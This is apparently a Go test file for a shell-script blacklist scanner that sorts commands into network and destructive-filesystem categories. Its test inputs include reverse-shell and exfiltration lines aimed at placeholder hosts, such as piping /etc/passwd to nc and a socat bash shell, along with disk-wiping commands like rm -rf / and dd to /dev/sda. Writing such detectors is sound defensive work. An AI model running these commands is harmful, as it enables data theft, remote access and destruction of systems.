package security

import (
	"testing"
)

func newBL() *ASTBlacklist { return NewASTBlacklist() }

// ── Clean scripts ─────────────────────────────────────────────────────────────

func TestASTBlacklist_Clean(t *testing.T) {
	cases := []struct {
		name   string
		script string
	}{
		{"echo", "echo hello"},
		{"go test", "go test ./..."},
		{"ls", "ls -la /tmp"},
		{"rm no flags", "rm /tmp/file.txt"},
		{"rm recursive only", "rm -r /tmp/build"},
		{"rm force only", "rm -f /tmp/file"},
		{"rm --recursive only", "rm --recursive /tmp/build"},
		{"rm --force only", "rm --force /tmp/file"},
		{"dd to regular file", "dd if=/dev/zero of=/tmp/file bs=1M count=1"},
		{"chmod non-world-writable", "chmod 755 script.sh"},
		{"chmod recursive non-world-writable", "chmod -R 755 /etc"},
		{"git", "git commit -m \"message\""},
		{"go build", "go build ./..."},
	}

	bl := newBL()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			violations, err := bl.Scan(tc.script)
			if err != nil {
				t.Fatalf("unexpected parse error: %v", err)
			}
			if len(violations) != 0 {
				t.Errorf("expected no violations, got %+v", violations)
			}
		})
	}
}

// ── Network violations ────────────────────────────────────────────────────────

func TestASTBlacklist_NetworkViolations(t *testing.T) {
	cases := []struct {
		name        string
		script      string
		wantCommand string
	}{
		{"curl direct", "curl https://example.com", "curl"},
		{"wget direct", "wget http://evil.com/payload", "wget"},
		{"nc direct", "nc attacker.com 4444", "nc"},
		{"ssh", "ssh user@host", "ssh"},
		{"socat", "socat TCP:attacker.com:4444 EXEC:/bin/bash", "socat"},
		{"nc in pipeline", "cat /etc/passwd | nc attacker.com 4444", "nc"},
		{"wget in subshell", "$(wget http://evil.com) && echo done", "wget"},
		{"curl in if", "if true; then curl http://evil.com; fi", "curl"},
		{"curl absolute path", "/usr/bin/curl https://example.com", "curl"},
	}

	bl := newBL()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			violations, err := bl.Scan(tc.script)
			if err != nil {
				t.Fatalf("unexpected parse error: %v", err)
			}
			if len(violations) == 0 {
				t.Fatal("expected at least one violation, got none")
			}
			found := false
			for _, v := range violations {
				if v.Command == tc.wantCommand {
					found = true
					if v.Category != CategoryNetwork {
						t.Errorf("expected CategoryNetwork, got %v", v.Category)
					}
					if v.Line == 0 {
						t.Error("Line should be > 0")
					}
					if v.Col == 0 {
						t.Error("Col should be > 0")
					}
				}
			}
			if !found {
				t.Errorf("expected violation for command %q, got %+v", tc.wantCommand, violations)
			}
		})
	}
}

// ── Destructive filesystem violations ────────────────────────────────────────

func TestASTBlacklist_DestructiveFSViolations(t *testing.T) {
	cases := []struct {
		name        string
		script      string
		wantCommand string
	}{
		{"rm -rf", "rm -rf /", "rm"},
		{"rm -fr", "rm -fr /", "rm"},
		{"rm -Rf", "rm -Rf /", "rm"},
		{"rm -r -f separate", "rm -r -f /", "rm"},
		{"rm --recursive --force", "rm --recursive --force /", "rm"},
		{"rm --force --recursive", "rm --force --recursive /", "rm"},
		{"rm --recursive -f mixed", "rm --recursive -f /", "rm"},
		{"shred", "shred /dev/sda", "shred"},
		{"mkfs.ext4", "mkfs.ext4 /dev/sdb", "mkfs.ext4"},
		{"mkfs bare", "mkfs /dev/sdb", "mkfs"},
		{"dd to device", "dd if=/dev/zero of=/dev/sda", "dd"},
		{"chmod -R 777", "chmod -R 777 /etc", "chmod"},
		{"chmod -R a+w", "chmod -R a+w /etc", "chmod"},
		{"chmod -R o+w", "chmod -R o+w /etc", "chmod"},
		{"chmod -R +w bare", "chmod -R +w /etc", "chmod"},
		{"wipefs", "wipefs /dev/sda", "wipefs"},
		{"fdisk", "fdisk /dev/sda", "fdisk"},
		{"blkdiscard", "blkdiscard /dev/sda", "blkdiscard"},
	}

	bl := newBL()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			violations, err := bl.Scan(tc.script)
			if err != nil {
				t.Fatalf("unexpected parse error: %v", err)
			}
			if len(violations) == 0 {
				t.Fatal("expected at least one violation, got none")
			}
			found := false
			for _, v := range violations {
				if v.Command == tc.wantCommand {
					found = true
					if v.Category != CategoryDestructiveFS {
						t.Errorf("expected CategoryDestructiveFS, got %v", v.Category)
					}
				}
			}
			if !found {
				t.Errorf("expected violation for command %q, got %+v", tc.wantCommand, violations)
			}
		})
	}
}

// ── Multiple violations ───────────────────────────────────────────────────────

func TestASTBlacklist_MultipleViolations(t *testing.T) {
	bl := newBL()
	violations, err := bl.Scan("rm -rf /data && curl http://evil.com/notify")
	if err != nil {
		t.Fatalf("unexpected parse error: %v", err)
	}
	if len(violations) != 2 {
		t.Fatalf("expected 2 violations, got %d: %+v", len(violations), violations)
	}

	var hasNetwork, hasDestructive bool
	for _, v := range violations {
		if v.Category == CategoryNetwork {
			hasNetwork = true
		}
		if v.Category == CategoryDestructiveFS {
			hasDestructive = true
		}
	}
	if !hasNetwork {
		t.Error("expected a network violation")
	}
	if !hasDestructive {
		t.Error("expected a destructive FS violation")
	}
}

// ── Parse error ───────────────────────────────────────────────────────────────

func TestASTBlacklist_ParseError(t *testing.T) {
	bl := newBL()
	violations, err := bl.Scan("$((")
	if err == nil {
		t.Fatal("expected parse error for invalid script, got nil")
	}
	if violations != nil {
		t.Errorf("expected nil violations on parse error, got %+v", violations)
	}
}

// ── ViolationCategory.String ──────────────────────────────────────────────────

func TestViolationCategory_String(t *testing.T) {
	cases := []struct {
		cat  ViolationCategory
		want string
	}{
		{CategoryNetwork, "network"},
		{CategoryDestructiveFS, "destructive_fs"},
		{ViolationCategory(99), "ViolationCategory(99)"},
	}
	for _, tc := range cases {
		if got := tc.cat.String(); got != tc.want {
			t.Errorf("%d.String() = %q, want %q", uint(tc.cat), got, tc.want)
		}
	}
}

// ── Prefix precision ──────────────────────────────────────────────────────────

func TestASTBlacklist_PrefixPrecision(t *testing.T) {
	bl := newBL()

	// mkfs.ext4 must be caught (dot-namespaced variant)
	if v, _ := bl.Scan("mkfs.ext4 /dev/sdb"); len(v) == 0 {
		t.Error("mkfs.ext4 should be denied")
	}

	// A command that merely starts with "mkfs" but is not a dot-variant must not
	// be caught — the fix prevents overly broad prefix matching.
	if v, _ := bl.Scan("mkfscheck /dev/sdb"); len(v) != 0 {
		t.Errorf("mkfscheck should not be denied, got %+v", v)
	}
}

// ── Position tracking ─────────────────────────────────────────────────────────

func TestASTBlacklist_ViolationPosition(t *testing.T) {
	bl := newBL()
	// curl is on line 2
	violations, err := bl.Scan("echo hello\ncurl https://example.com")
	if err != nil {
		t.Fatalf("unexpected parse error: %v", err)
	}
	if len(violations) == 0 {
		t.Fatal("expected violation for curl")
	}
	v := violations[0]
	if v.Line != 2 {
		t.Errorf("expected Line=2, got %d", v.Line)
	}
	if v.Col == 0 {
		t.Errorf("expected Col > 0, got %d", v.Col)
	}
}
